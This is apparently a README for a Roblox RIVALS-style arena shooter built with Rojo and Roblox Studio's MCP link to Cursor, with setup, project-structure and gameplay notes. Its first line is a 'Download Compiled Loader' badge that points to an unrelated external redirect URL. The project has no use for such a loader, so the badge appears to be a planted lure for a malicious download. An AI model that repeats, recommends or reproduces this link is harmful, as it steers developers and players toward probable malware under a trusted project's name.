# Roblex — RIVALS-style FPS Arena Shooter

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A fast-paced 1v1 / 2v2 arena shooter built with **Rojo**, **Roblox Studio**, and **Cursor MCP**.

## Quick Start

### 1. Tools

| Tool | Purpose |
|------|---------|
| [Rojo 7.4+](https://rojo.space/) | Syncs local `.lua` files into Studio |
| [Rojo Studio plugin](https://create.roblox.com/store/asset/13916111004/Rojo-7) | Connects Studio to `rojo serve` |
| Roblox Studio (latest) | Built-in MCP server for AI playtesting |

Rojo is included locally at `tools/rojo.exe`, or install via `aftman install`.

### 2. Start Rojo sync

```powershell
cd c:\Users\Jacob\Desktop\Roblex
.\tools\serve-rojo.ps1
```

If you see "already running", either connect Studio to that server or restart with:

```powershell
.\tools\serve-rojo.ps1 -Restart
```

**Do not run `.\tools\rojo.exe serve` directly** if a server is already up — Windows will show error 10048 (port in use).

In Studio: **Plugins → Rojo → Connect** (`localhost:34872`).

### 3. Enable MCP (Cursor ↔ Studio)

1. Studio → **Assistant → … → Manage MCP Servers**
2. Enable **Enable Studio as MCP server**
3. Under **Quick connect**, turn **Cursor** ON

Or add to `%USERPROFILE%\.cursor\mcp.json`:

```json
{
  "mcpServers": {
    "Roblox_Studio": {
      "command": "cmd.exe",
      "args": ["/c", "%LOCALAPPDATA%\\Roblox\\mcp.bat"]
    }
  }
}
```

Restart Cursor and Studio. Look for the green connected indicator in Studio.

## Project Structure

```
src/
├── ReplicatedStorage/Modules/   Shared game logic (GunService, WeaponConfig, …)
├── ServerScriptService/         Server scripts (.server.lua)
├── StarterPlayer/StarterPlayerScripts/  Client gameplay (.client.lua)
└── StarterGui/HUD/              HUD LocalScript (init.client.lua)
```

## Studio Setup (Arena)

Build this in Workspace for team spawns (optional — fallback spawns exist):

```
Workspace
└── Arenas
    └── Arena1
        └── Spawns
            ├── TeamA  (SpawnLocation parts)
            └── TeamB  (SpawnLocation parts)
```

Optional viewmodel: `ReplicatedStorage/Assets/ViewModels/Rifle` (Model). A fallback gun is built in code if missing.

## Gameplay

- **1v1** default (`GameConfig.DEFAULT_MATCH_MODE = "OneVOne"`)
- Server-authoritative hitscan rifle (12 RPM, 30-round mag)
- FPS camera with ADS (right-click), sway, recoil, viewmodel
- Round-based teams — first to 5 round wins
- HUD: crosshair, health bar, ammo, kill feed

## Testing

1. Run `rojo serve` and connect Studio
2. Press Play with **2 players** (Test → Start Server + Player)
3. Players auto-join matchmaking after 3 seconds
4. Countdown → fight → round win → match win

## Milestones Implemented

1. **Raycast Gun Engine** — `GunService`, `GunController`, `HitDetection`, `WeaponConfig`
2. **ViewModel & Camera** — `ViewModelController`, `CameraController`, `Spring`
3. **1v1/2v2 Rounds** — `MatchService`, `RoundService`, `SpawnService`
4. **RIVALS UI** — `StarterGui/HUD`, `HUDListener`
